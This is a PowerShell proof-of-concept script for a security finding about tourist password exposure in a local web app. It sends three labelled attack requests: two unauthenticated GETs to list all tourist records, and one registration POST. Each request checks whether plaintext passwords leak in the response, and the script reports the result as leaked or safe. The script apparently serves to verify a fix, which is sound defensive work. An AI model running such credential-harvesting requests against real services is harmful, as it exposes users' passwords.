# ==============================================================================
# Security Proof of Concept Script: Finding #6 - Tourist Password Exposure
# Target: fix-secure-massdata
# ==============================================================================

$BaseUrl = "http://localhost:4000"

function Print-Header($title) {
    Write-Host "`n################################################################" -ForegroundColor DarkGray
    Write-Host "# $title" -ForegroundColor White
    Write-Host "################################################################`n" -ForegroundColor DarkGray
}

Clear-Host

# ------------------------------------------------------------------------------
# ATTACK 1: Public fetch of all tourists via GET /api/Tourist/
# ------------------------------------------------------------------------------
Print-Header "ATTACK 1 - Fetch all tourist records via /api/Tourist (No Auth)"

Write-Host "$ curl $BaseUrl/api/Tourist/`n" -ForegroundColor Gray

try {
    $response = Invoke-RestMethod -Uri "$BaseUrl/api/Tourist/" -Method Get -ErrorAction Stop
    $jsonOutput = $response | ConvertTo-Json -Depth 3 -Compress
    
    if ($jsonOutput.Length -gt 250) {
        $preview = $jsonOutput.Substring(0, 250) + "..."
    } else {
        $preview = $jsonOutput
    }
    Write-Host $preview -ForegroundColor White
    
    $hasPassword = $false
    if ($response -is [array]) {
        $hasPassword = ($response | Where-Object { $_.password -ne $null }).Count -gt 0
    } elseif ($response.password) {
        $hasPassword = $true
    }

    if ($hasPassword) {
        Write-Host "`n>>> HTTP status: 200   <-- ALL PASSWORDS LEAKED IN PLAIN TEXT" -ForegroundColor Red
    } else {
        Write-Host "`n>>> HTTP status: 200   <-- SAFE: PASSWORDS EXCLUDED FROM RESPONSE" -ForegroundColor Green
    }
} catch {
    $statusCode = $_.Exception.Response.StatusCode.value__
    Write-Host "`n>>> HTTP status: $statusCode   <-- BLOCKED / RESTRICTED" -ForegroundColor Green
}

# ------------------------------------------------------------------------------
# ATTACK 2: Public fetch via GET /api/TouristRegister/all
# ------------------------------------------------------------------------------
Print-Header "ATTACK 2 - Fetch all tourists & credentials via /api/TouristRegister/all"

Write-Host "$ curl $BaseUrl/api/TouristRegister/all`n" -ForegroundColor Gray

try {
    $response = Invoke-RestMethod -Uri "$BaseUrl/api/TouristRegister/all" -Method Get -ErrorAction Stop
    $jsonOutput = $response | ConvertTo-Json -Depth 3 -Compress
    
    if ($jsonOutput.Length -gt 250) {
        $preview = $jsonOutput.Substring(0, 250) + "..."
    } else {
        $preview = $jsonOutput
    }
    Write-Host $preview -ForegroundColor White

    # Handle both direct array or wrapped { data: [...] } format
    $items = if ($response.data) { $response.data } else { $response }
    
    $hasPassword = $false
    if ($items -is [array]) {
        $hasPassword = ($items | Where-Object { $_.password -ne $null }).Count -gt 0
    } elseif ($items.password) {
        $hasPassword = $true
    }

    if ($hasPassword) {
        Write-Host "`n>>> HTTP status: 200   <-- SENSITIVE CREDENTIALS & EMAILS EXPOSED" -ForegroundColor Red
    } else {
        Write-Host "`n>>> HTTP status: 200   <-- SAFE: PASSWORDS EXCLUDED" -ForegroundColor Green
    }
} catch {
    $statusCode = $_.Exception.Response.StatusCode.value__
    Write-Host "`n>>> HTTP status: $statusCode   <-- BLOCKED / RESTRICTED" -ForegroundColor Green
}

# ------------------------------------------------------------------------------
# ATTACK 3: Create a new tourist and check response body
# ------------------------------------------------------------------------------
Print-Header "ATTACK 3 - Register tourist and inspect return payload for password reflection"

$randomId = Get-Random -Minimum 1000 -Maximum 9999
$testUser = @{
    name = "Security Test User $randomId"
    nic = "99000${randomId}V"
    email = "test_$randomId@demo.com"
    phone = "077123$randomId"
    password = "SuperSecretPassword123!"
} | ConvertTo-Json

Write-Host "$ curl -X POST $BaseUrl/api/Tourist/add -d '{... \"password\":\"SuperSecretPassword123!\" ...}'`n" -ForegroundColor Gray

try {
    $response = Invoke-RestMethod -Uri "$BaseUrl/api/Tourist/add" -Method Post -Body $testUser -ContentType "application/json" -ErrorAction Stop
    $jsonOutput = $response | ConvertTo-Json -Depth 3 -Compress
    Write-Host $jsonOutput -ForegroundColor White

    if ($response.password) {
        Write-Host "`n>>> HTTP status: 201   <-- CREATED: PLAINTEXT PASSWORD REFLECTED IN RESPONSE" -ForegroundColor Red
    } else {
        Write-Host "`n>>> HTTP status: 201   <-- CREATED: PASSWORD SANITIZED FROM RESPONSE" -ForegroundColor Green
    }
} catch {
    $statusCode = $_.Exception.Response.StatusCode.value__
    Write-Host "`n>>> HTTP status: $statusCode   <-- REQUEST REJECTED" -ForegroundColor Yellow
}

Write-Host ""
